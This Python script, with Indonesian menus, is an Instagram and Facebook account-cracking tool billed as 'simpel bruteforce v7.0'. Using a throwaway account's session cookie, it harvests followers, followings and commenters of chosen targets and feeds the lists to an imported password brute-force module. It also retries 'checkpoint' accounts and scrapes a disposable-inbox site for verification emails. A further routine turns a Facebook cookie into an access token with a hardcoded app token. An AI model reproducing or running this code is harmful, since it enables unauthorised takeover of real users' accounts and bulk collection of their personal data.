#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
- META 2024 -

Menu Premium
Code By Khamdihi Dev - Purbalingga
"""

Los, xx, un = 0, 0, []
Warning = '\n\n [!] Jangan Edit Apapun Agar Script Berjalan Dengan Semestinya, terima kasih'

import requests, platform, os, re, time, sys, pytz, json, random, datetime
from bs4 import BeautifulSoup as bsp
from concurrent.futures import ThreadPoolExecutor
from Cryptodome.Cipher import AES, PKCS1_v1_5
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes

from method import ibrut_old as Bdt_old
from method import ApiKey

from rich import print as Print
from rich.panel import Panel as Nel
from rich.console import Console

P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K = "\033[33m"
M, K2 = K, K
Tema  = []
Mail  = []
datetim = datetime.datetime.now()
datenow = '%s-%s-%s'%(datetim.day,datetim.month,datetim.year)

class MAIN:

   userid = [] #-> Dump IG
   pk_idg = [] #-> Dump IG
   fauser = [] #-> Dump Facebook

   def __init__(self):
       super(MAIN).__init__()

   def MyRich(self, Text, chos=None, title=None):
       if os.path.isfile('cat_rich.py') is True:
          import cat_rich
          self.cat = cat_rich.khamdihi
       else:
          self.cat = 'color(8)'
       if self.cat not in Tema:Tema.append(self.cat)
       if chos:
          Console(width=62).print(Nel(Text,subtitle='┌─',subtitle_align='left',\
          style=self.cat,title=title))
       else:
          Console(width=62).print(Nel(Text, \
          style=self.cat,title=title))

   def Me(self):
       self.MyRich('''[white] _____  _____  _____  _____
/  ___>/     \/  _  \|  _  \  || create by
|___  ||  |--||  _  <|  |  |  || khamdihi dev
<_____/\_____/\_____/|_____/  || simpel bruteforce v7.0
''')

   def find_res(self, meki=[]):
       try:
           self.file = os.listdir('data')
           self.dihi = 0
           print('\n [ Pilih File Anda ]\n')
           for self.su in self.file:
               if 'ok' not in self.su.lower() or 'cp' in self.su.lower():pass
               else:
                    self.dihi +=1
                    print(' %s. %s'%(self.dihi,self.su))
           self.name = input('\n Masukan nama file : ')
       except Exception as e:exit(e)
       for a in open(f'data/{self.name}','r').read().splitlines():
           xyz = re.findall('ds_user_id=(.*)',str(a))
           if len(xyz) == 0:continue
           else:
                if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
       if len(meki) == 0:
          exit(f'\nTidak Bisa menemukan cokie!')
       else:
          for memek in meki:
              try:
                  print(f'\n Mencoba: {H}{memek}{P}')
                  xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
                  uid = re.search('ds_user_id=(\d+)', str(memek)).group(1)
                  req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':memek}).json()['user']['full_name']
                  open('data/IG-login.txt','w').write(f'{memek}')
                  print(f'\n {P}Login sebagai : {H}{req}')
                  time.sleep(2)
                  os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
                  self.insta()
              except Exception as e:
                  print(f'\n{P} Expired: {K}{memek}')

   def aset_ig(self):
       os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
       if os.path.isfile('data/IG-login.txt') is True:
           self.coki = {'cookie':open('data/IG-login.txt','r').read()}
       else:
           os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
           self.Me()
           self.MyRich("[white]Jika Anda Sudah Mendapatkan Result OK Anda Bisa Login Menggunakan Hasil Yang Tadi Dengan Ketikan '[green]res[/]' Jika Belum Punya Masukan Cookie Akun Instagram Di Bawah Ini",True)
           self.momo = {'cookie':Console(style=Tema[0]).input(f'   └──> ')}
           if self.momo['cookie'] == 'res':
              self.coki = {'cookie':self.find_res()}
           else:self.coki = self.momo
       try:
           xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
           cek = requests.get('https://www.instagram.com/api/v1/tags/web_info/?tag_name=khmd', headers=xyz,  cookies=self.coki).json()
           uid = re.search('ds_user_id=(\d+)', str(self.coki['cookie'])).group(1)
           req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies=self.coki).json()['user']
           open('data/IG-login.txt','w').write(f'{self.coki["cookie"]}')
       except:
           os.system('rm -rf data/IG-login.txt')
           print('\nInvalid cookie')
           exit()
       os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
       return self.coki, req['full_name'], req['follower_count'], req['username']

   def insta(self):
       os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
       self.aset, self.nama, self.fol, self.usr = self.aset_ig()
       self.Me()
       self.Os = True
       if self.Os is True:
          self.username = 'Mem'
          self.join     = 'Banyak Dosa'
          self.expired  = 'Permanen'
          self.status   = 'Anak Emas'
       else:
          self.validasi = ApiKey.UserKey().konfirkeys()
          self.username = self.validasi.split('|')[0]
          self.join     = self.validasi.split('|')[1]
          self.expired  = str(self.validasi.split('|')[2]) + str(' Hari')
          self.status   = None

       if len(self.nama) > 11:
          self.nama = self.nama[:11]

       self.ds_user  = re.search('ds_user_id=(\d+)',str(self.aset)).group(1)
       self.MyRich(f'''[white]
 >> Username         : {self.username} [Keys]
 >> Bergabung        : {self.join}
 >> Kadarluarsa      : {self.expired}
 >> Status User      : {self.status}

 >> Username         : {self.usr} [Akun]
 >> FullName         : {self.nama}
 >> Followers        : {self.fol}
 >> User ID          : {self.ds_user} \n''',None,'[white]> [green]DETAIL USER[/] <')

       self.MyRich(''' [white]01. Crack Dari Followers    06. Crack Dari Komentar
 02. Crack Dari Following    07. Crack Unlimited Followers
 03. Check Akun Checkpoint   08. Setting Thema/Warna Panel
 04. Check Hasil Crack       09. Laporkan Bug/Upgrade Key
 05. Save Hasil Ke SDcard    10. Ganti Akun Tumbal
 11. Cari Akun Verif Email   12. Crack Akun Facebook''',True)
       self.chs(self.aset)

   def chs(self, assets):
       while True:
         x = Console(style=Tema[0]).input(f'   └──> ')
         if x in   ['01','1']:self.dumps(assets, True)
         elif x in ['02','2']:self.dumps(assets, False)
         elif x in ['03','3']:self.Ulang()
         elif x in ['04','4']:self.igrst()
         elif x in ['05','5']:self.save_sd()
         elif x in ['06','6']:self.komentar(assets)
         elif x in ['07','7']:self.Unli(assets)
         elif x in ['08','8']:self.theme()
         elif x in ['09','9']:exit(os.system('xdg-open https://wa.me/+6285729416714?text='))
         elif x in ['10']:os.system('rm -rf data/IG-login.txt');self.insta()
         elif x in ['12']:
              exit('\nFiture Akan Tersedia Dalam Beberapa H/M')
              if os.path.isfile('data/FB-login.txt') is False:
                 exit(self.MyRich(f'[white]\
Untuk Menggunakan Fitur Ini Anda Harus Jalankan Dengan Memasukan Perintah Di Bawah Ini\n\
\n\t    [bold green]python {sys.argv[0]} FACEBOOK=True[/]\n\
\n\tSalin Text Di Atas Untuk Mempercepat!'))
              else:
                 try:
                     self.cokie, self.token = open('data/FB-login.txt','r').read().split('|')
                     self.req = requests.post('https://graph.facebook.com/me?batch=[{"method":"get","relative_url":"me"}]&include_headers=false&access_token=%s'%(self.token), cookies={'cookie':self.cokie}).json()
                     self.res = json.loads(self.req[0]['body'])
                     self.ttl = self.res['birthday']
                     self.uid = self.res['id']
                     self.lam = self.Gender(self.res['gender'])
                     self.nam = self.res['name']
                     self.MyRich(f'[white]\n >> Nama Users : {self.nam}\n >> Gender     : {self.lam}\n >> BirthDay   : {self.ttl}\n >> UserID     : {self.uid}\n',None,'[white]> [green]DETAIL USER[/] <')
                 except (KeyError, Exception):
                     exit('\nMembutuhkan cookie baru!')
              self.Facebook(cookies=self.cokie, token=self.token)
         elif x in ['11']:
              self.MyRich('[white]Masukan Kata Kunci Untuk Pencarian Email, Misalnya : good,boy,girl kata kunci dengan menggunakan bahasa inggris akan cepat mendapatkan email!',True)
              self.Target = Console(style=Tema[0]).input(f'   └──> ').replace(' ','').split(',')
              self.MyRich('[white] 01. Tampilkan Hanya Email Dari Facebook\n 02. Tampilkan Hanya Email Dari Instagram\n 03. Tampilkan Hanya Email Dari Tiktok\n 04. Tampilkan Hanya Email Dari Twitter\n 05. Tampilkan Semua Tidak Di Filter',True)
              self.fil = Console(style=Tema[0]).input(f'   └──> ')
              if self.fil in   ['1','01']:filter='fb'
              elif self.fil in ['2','02']:filter='ig'
              elif self.fil in ['3','03']:filter='tk' # tiktok
              elif self.fil in ['4','04']:filter='tw' # twiter
              elif self.fil in ['5','05']:filter='ls' # all
              else:filter='ls'
              self.CariNama(self.Target, filter)

   def CariNama(self, Items, Fil):
       self.MyRich(f'[white]Proses Sedang Di Mulai! Email Yang Tersedia Akun [Tiktok,Facebook,Instagram,Twitter] Akan Di Simpan Di Dalam Folder [green]data/email/Email-{datenow}[/] Nikamati Semua Fiture Yang Saya Berikan:)')
       self.bef = []
       print('')
       with ThreadPoolExecutor(max_workers=3) as Executor:
           for self.e in Items:
               Executor.submit(self.FindMesage, self.e, self.bef, Fil)
       if len(self.bef) !=0:
          exit(f'\nSelamat Kamu Mendapatkan {len(self.bef)} Email\nKata Kunci {Items}')
       else:
          exit('\nGunakan Kata Kunci Yang Lain!')

   def FindMesage(self, user, duplikat, filters):
       try:
            self.req = requests.get(f'https://inboxkitten.com/api/v1/mail/list?recipient={user}').json()
            for self.mes in self.req:
                self.sender = re.findall("'sender': '(.*?)'",str(self.mes))
                self.alamat = re.findall("'recipient': '(.*?)'",str(self.mes))
                if str(filters) == 'ls':
                   if 'instagram' in str(self.sender[0].lower()) or 'facebook' in str(self.sender[0].lower()) or 'instagram' in str(self.sender[0].lower()) or 'tiktok' in str(self.sender[0].lower()) or 'tiktok' in str(self.sender[0].lower()) or 'twitter' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                          open(f'data/email/EmailAcak-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                   else: Los +=1
                elif str(filters) == 'ig':
                    if 'instagram' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'data/email/EmailInstagram-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                    else: Los +=1
                elif str(filters) == 'tk':
                    if 'tiktok' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'data/email/EmailTiktok-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                    else: Los +=1
                elif str(filters) == 'tw':
                    if 'twitter' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'data/email/EmailTwitter-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                    else: Los +=1
                elif str(filters) == 'fb':
                    if 'facebook' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'data/email/EmailFacebook-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                    else: Los +=1
            print(f'Success: {len(duplikat)} Skip: {Los}',end='\r')
       except:pass

   def Facebook(self, **args):
       self.token = str(args['token'])
       self.cokie = str(args['cookies'])
       self.MyRich('''[white] 01. Crack Dari Teman           06. Check Hasil Crack
 02. Crack Dari Komentar        07. Crack Ulang Akun CP
 03. Crack Dari Anggota Group   08. Check Opsi Akun CP
 04. Crack Dari Pencarian Nama  09. Ganti Akun Tumbal
 05. Crack Dari Random Email    10. Kembali''',True)
       while True:
          x = Console(style=Tema[0]).input(f'   └──> ')
          if x in   ['01','1']:self.TemanFb(self.cokie, self.token)
          elif x in ['02','2']:self.KomentarFb(self.cokie)
          elif x in ['03','3']:self.AnggotaGroup(self.cokie)
          elif x in ['04','4']:self.PencarianNamaFb(self.cokie)
          elif x in ['05','5']:self.RandomEmail()
          elif x in ['06','6']:self.HasilFb()
          elif x in ['07','7']:self.CrackUlangFb()
          elif x in ['08','8']:self.CekOpsi()
          elif x in ['09','9']:os.system('rm -rfdata/FB-login.txt');self.insta()
          elif x in ['10']:self.insta()

   def TemanFb(self, cokie, token):
       self.MyRich('[white]Masukan ID Target Gunakan Tanda Koma Sebagai Pemisah (,)',True)
       self.ab = Console(style=Tema[0]).input(f'   └──> ').split(',')
       with ThreadPoolExecutor(max_workers=2) as Exe:
          for self.id in self.ab:Exe.submit(self.DumpTeman, self.id, cokie, token)

   def DumpTeman(self, user, cokie, token):
       with requests.Session() as self.r:
         try:
             self.req = self.r.get('https://graph.facebook.com/%s?fields=friends&access_token=%s'%(user, token), cookies={'cookie':cokie}).json()['friends']['data']
             for self.apc in self.req:
                 self.mat = '%s|%s'%(self.apc['name'], self.apc['id'])
                 if self.mat not in self.fauser:self.fauser.append(self.mat)
         except:pass

   def KomentarFb(self, cokie):
       self.MyRich('[white]Masukan link postingan Pastikan Target Bersifat Publik [Group,Post Teman]',True)
       self.link = Console(style=Tema[0]).input(f'   └──> ')
       self.host = self.link.split('//')[1].split('/')[0]
       self.repl = self.link.replace(self.host,'mbasic.facebook.com')
       self.DumpKomen(self.repl, cokie)

   def DumpKomen(self, curl, cokie):
       with requests.Session() as self.r:
         try:
             self.req  = self.r.get(curl, cookies={'cookie':cokie}).text
             self.data = re.findall('<h3><a class=".*?" href="(.*?)">(.*?)</a></h3>', str(self.req))
             for self.apc in self.data:
                 if '/profile.php?' in self.apc[0]:
                     self.id, self.nama = re.search('id=(.*?)&',str(self.apc[0])).group(1), self.apc[1]
                     self.mat = '%s|%s'%(self.nama, self.id)
                     print(self.mat)
                     if self.mat not in self.fauser:self.fauser.append(self.mat)
                 else:
                     self.username, self.nama = re.search('/(.*?)?eav',str(self.apc[0])).group(1), self.apc[1]
                     self.mat = '%s|%s'%(self.nama, self.username.split('?')[0])
                     print(self.mat)
                     if self.mat not in self.fauser:self.fauser.append(self.mat)
             for self.link in bsp(self.req,'html.parser').find_all('a', href=True):
                 if 'Lihat komentar lainnya…' in str(self.link.text):
                     self.DumpKomen(self.link['href'], cokie)
                 else:continue
         except:pass

   def Gender(self, xxxx):
       return 'Laki-Laki' if xxxx.lower() == 'male' else 'Perempuan'

   def theme(self):
       self.MyRich('\
[white] 01. Set Tema Hijau          04. Set Tema Putih\n\
 02. Set Tema Merah          05. Set Tema Ungu\n\
 03. Set Tema Biru           06. Set Tema Kuning\n\
 07. Set Tema Default',True)
       while True:
          x = Console(style=Tema[0]).input(f'   └──> ')
          if x in   ['01','1']:open('cat_rich.py','w').write("khamdihi = 'color(10)'")
          elif x in ['02','2']:open('cat_rich.py','w').write("khamdihi = 'color(9)'")
          elif x in ['03','3']:open('cat_rich.py','w').write("khamdihi = 'color(4)'")
          elif x in ['04','4']:open('cat_rich.py','w').write("khamdihi = 'color(7)'")
          elif x in ['05','5']:open('cat_rich.py','w').write("khamdihi = 'color(5)'")
          elif x in ['06','6']:open('cat_rich.py','w').write("khamdihi = 'color(3)'")
          elif x in ['07','7']:open('cat_rich.py','w').write("khamdihi = 'color(8)'")
          exit(os.system(f'python {sys.argv[0]}'))

   def save_sd(self, col = []):
       try:
           self.file = os.listdir('data')
           self.hitg = 0
           print('\n [ Pilih File Anda ]\n')
           for self.su in self.file:
               self.xy = self.su.split('Instagram')
               if len(self.xy) <2:pass
               else:
                    self.hitg +=1
                    col.append(self.su)
                    print(' %s. %s'%(self.hitg,self.su))
           print('')
           self.MyRich('[white]Ketik [green]all[/] Untuk Menyimpan Semua Hasil Crack Anda Ke sdcard OnTap. Masukan nama file jika ingin menyimpan salah satu',True)
           self.name = Console(style=Tema[0]).input(f'   └──> ')
           if self.name in ('all','All'):
              for self.xyz in col:
                  os.system(f'cp data/{self.xyz} /sdcard')
              exit('\nDone')
           else:
              os.system(f'cp data/{self.name} /sdcard')
              exit('\nDone')
       except Exception as e:exit(e)

   def komentar(self, cokie, dav=[]):
       self.MyRich('[white]Masukan link postingan atau reels. pisahkan dengan koma',True)
       link = Console(style=Tema[0]).input(f'   └──> ').split(',')
       try:
           for ling in link:
               self.r = requests.get(ling, cookies=cokie).text
               self.o = re.search('"media_id":"(\d+)"', str(self.r)).group(1)
               dav.append(self.o)
           for self.x in dav:
               self.dump_komen(cokie, self.x, '')
       except:pass
       self.ToolsType()

   def dump_komen(self, cokie, uid, min):
       global xx
       try:
            self.r = requests.get(f"https://i.instagram.com/api/v1/media/{uid}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min}", cookies = cokie, headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}).json()
            for self.i in self.r['comments']:
                self.a = self.i['user']['username'] +'|'+ self.i['user']['full_name']
                if self.a not in self.pk_idg:
                   self.pk_idg.append(self.a)
                   xx +=1
                   Console(style=Tema[0]).print(f'   └──> Berhasil dump [green]{xx}[/] id [white]{uid}[/]',end='\r')
            if 'next_min_id' in str(self.r):
                self.dump_komen(cokie, uid, self.r['next_min_id'])
       except:pass

   def Unli(self, cokie):
       if 'csrftoken' not in str(cokie['cookie']):
          try:
              self.memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cokie).json()
              self.token = self.memek['config']['csrf_token']
              cokie['cookie'] +=';csrftoken=%s;'%(self.token)
          except Exception as e:
              os.system('rm -rf data/IG-login.txt')
              exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
       self.MyRich('[white]Masukan username akun instagram Pastikan (Target Memiliki Followers, Akun Bersifat Publik, Tidak Centang Biru)[/]',True)
       self.user = Console(style=Tema[0]).input(f'   └──> ')
       try:
           req = requests.get(f'https://www.instagram.com/{self.user}/', cookies = cokie).text
           uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
           self.Exekusi(uid, cokie, '', True,True)
       except:pass
       if len(un) > 0:
          self.MyRich('[white]Matikan data/wifi jika anda ingin stop dump!. jangan gunakan [red]CTRL + C[/]')
          for self.momok in un:
              self.Graphql(True, self.momok, cokie['cookie'], '')
       else:exit('\nGanti Username/Tumbal!')
       self.ToolsType()

   def igrst(self):
       print('')
       self.dirs  = os.listdir('data')
       self.index = 0
       for self.name in self.dirs:
           if '-' not in self.name or 'login' in self.name:pass
           else:
                self.index+=1
                print(' %s. data/%s'%(self.index, self.name))
       print('')
       self.MyRich('\
[white]Masukan Nama File Untuk Melihat Hasil, Gunakan koma untuk pemisahan nama file',True)
       self.file = Console(style=Tema[0]).input(f'   └──> ').split(',')
       for self.bx in self.file:
           for self.xv in open(self.bx,'r').read().splitlines():
               print(' %s\n'%(self.xv))
       exit()

   def Ulang(self):
       try:
          dirs = os.listdir('data')
          asuu = 0
          if len(dirs) == 0:exit(f'\n{P}[{M}!{P}] File Tidak Ada')
          print('')
          for asu in dirs:
              if 'CP' not in str(asu):pass
              else:
                  asuu +=1
                  print(f' {asuu}. {asu}')
          print('')
          self.MyRich('[white]Masukan Nama file. Jangan Angkanya contoh: CP/Example.txt',True)
          file = Console(style=Tema[0]).input(f'   └──> ')
          for rest in open(f'data/{file}','r').read().splitlines():
              uid, pas = rest.split('|')[0], rest.split('|')[1]
              self.pk_idg.append(f'{uid}|{pas}')
              Console(style=Tema[0]).print(f'   └──> Berhasil dump [green]{len(self.pk_idg)}[/]',end='\r')
       except (FileNotFoundError,ValueError):
          exit('\nFile Tidak Ada Atau Pemisahan Salah.')
       self.ToolsType()

   def dumps(self, cintil, typess, xyz = []):
       if 'csrftoken' not in str(cintil['cookie']):
          try:
              self.memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cintil).json()
              self.token = self.memek['config']['csrf_token']
              cintil['cookie'] +=';csrftoken=%s;'%(self.token)
          except Exception as e:
              os.system('rm -rf data/IG-login.txt')
              exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
       self.MyRich('[white]Masukan username akun instagram Pastikan (Target Memiliki Followers, Akun Bersifat Publik, Tidak Centang Biru) Ingin banyak target gunakan tanda koma sebagai pemisah contohnya [green](Khamdihidev,Khamdihi)[/]',True)
       users = Console(style=Tema[0]).input(f'   └──> ').split(',')
       try:
           for self.y in users:
               req = requests.get(f'https://www.instagram.com/{self.y}/', cookies = cintil).text
               uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
               if uid not in xyz:xyz.append(uid)
       except:pass
       try:
           mode = 'followers' if typess is True else 'following'
           with ThreadPoolExecutor(max_workers=2) as Executor:
              for kintil in xyz:
                  if typess is True:
                      Executor.submit(self.Graphql, True, kintil, cintil['cookie'], '')
                  else:
                      Executor.submit(self.Graphql, False, kintil, cintil['cookie'], '')
       except:Executor.shutdown(wait=True)
       self.ToolsType()

   def Exekusi(self, uid, cokie, next, mode,unli=None):
       global xx
       headers = {'Host': 'www.instagram.com','x-requested-with': 'XMLHttpRequest','x-csrftoken': re.search('csrftoken=(.*?);',str(cokie['cookie'])).group(1),'x-ig-app-id': '1217981644879628','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
       params  = {'count': '12','search_surface': 'follow_list_page','max_id':next}
       if mode == 'following':response = requests.get(f'https://www.instagram.com/api/v1/friendships/{uid}/following/?count=12&max_id={next}', cookies=cokie,headers=headers).json()
       else:response = requests.get(f'https://www.instagram.com/api/v1/friendships/{uid}/followers/',params=params,cookies=cokie,headers=headers).json()
       for self.mmk in response['users']:
           xx+=1
           self.xy = self.mmk['username'] + '|' + self.mmk['full_name']
           if self.xy not in self.pk_idg:
              if unli is None:
                 self.pk_idg.append(self.xy)
              else:
                 self.zc = self.mmk['pk']
                 un.append(self.zc)
                 if len(un) == 5:
                    break
       if 'next_max_id' in str(response):
           self.Exekusi(uid, cokie, response['next_max_id'], mode)

   def Graphql(self, typess, userid, cokie,after):
       global xx
       self.api = "https://www.instagram.com/graphql/query/"
       self.csr = 'variables={"id":"%s","first":24,"after":"%s"}'%(userid,after)
       self.mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(self.csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(self.csr)
       try:
           self.ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
           self.req = requests.get(self.api, params=self.mek, headers=self.ptk).json()
           if 'require_login' in self.req:
               if len(self.pk_idg) > 0:
                  pass
               else:
                  exit(f'\n{P}Invalid Cookie')
           self.khm = 'edge_followed_by' if typess is True else 'edge_follow'
           for self.xyz in self.req['data']['user'][self.khm]['edges']:
               self.xy = self.xyz['node']['username'] + '|' + self.xyz['node']['full_name']
               if self.xy not in self.pk_idg:
                  xx +=1
                  self.pk_idg.append(self.xy)
                  Console(style=Tema[0]).print(f'   └──> Berhasil dump [green]{xx}[/] id [white]{userid}[/]',end='\r')
           self.end = self.req['data']['user'][self.khm]['page_info']['has_next_page']
           if self.end is True:
               self.after = self.req['data']['user'][self.khm]['page_info']['end_cursor']
               self.Graphql(typess, userid, cokie, self.after)
           else:pass
       except:pass

   def ToolsType(self):
       exit(Bdt_old.MAIN().List(self.pk_idg))

class MainDev:

   def __init__(self)->None:
       self.data, self.host = {}, 'https://m.facebook.com'
       self.token_app = '1348564698517390|007c0a9101b9e1c8ffab727666805038'

   def Run(self)->str:
       if len(sys.argv) == 2:
          if sys.argv[1].split('=')[1] == 'True':
             if os.path.isfile('data/FB-login.txt') is False:
                self.ok = True
                while self.ok:
                    self.ok = self.GetingCode(input('FBcookie: '))
                    if 'EAAT' in str(self.ok): break
                os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
                print('Login Berhasil, Fiture Facebook Sekarang Bisa Di Gunakan.')
                os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
                time.sleep(2)
                MAIN().insta()
             else:MAIN().insta()
       else:
          MAIN().insta()

   def GetingCode(self, coki):
       with requests.Session() as r:
         try:
              self.r = r.post(f'https://graph.facebook.com/v2.6/device/login?access_token={self.token_app}').json()
              self.user_code, self.code = self.r['user_code'], self.r['code']
              self.r1 = bsp(r.get(f'https://m.facebook.com/device?user_code={self.user_code}', cookies = {'cookie':coki}).text,'html.parser')
              self.ls = ['fb_dtsg','jazoest','qr']
              for self.i in self.r1.find_all('input'):
                  if self.i.get('name') in self.ls: self.data.update({self.i['name']:self.i['value']})
              self.data.update({'user_code':self.user_code})
              self.ul = self.r1.find('form', method='post')['action']
              self.r2 = bsp(r.post(self.host + self.ul, data=self.data, cookies = {'cookie':coki}).text,'html.parser')
              self.data.clear()
              for self.a in self.r2.find_all('input'):
                  if self.a.get('name') == '__CANCEL__':pass
                  else:self.data.update({self.a.get('name','submit'):self.a.get('value')})
              self.r3 = r.post(self.host + self.r2.find('form', method='post')['action'], data=self.data, cookies = {'cookie':coki}).text
              self.r4 = r.post(f'https://graph.facebook.com/v2.6/device/login_status?access_token={self.token_app}&code={self.code}',cookies = {'cookie':coki}).json()['access_token']
              self.rt = '%s|%s'%(coki, self.r4)
              open('data/FB-login.txt','w').write(self.rt)
              return self.r4
         except (KeyError, Exception):
              return True

MainDev().Run()
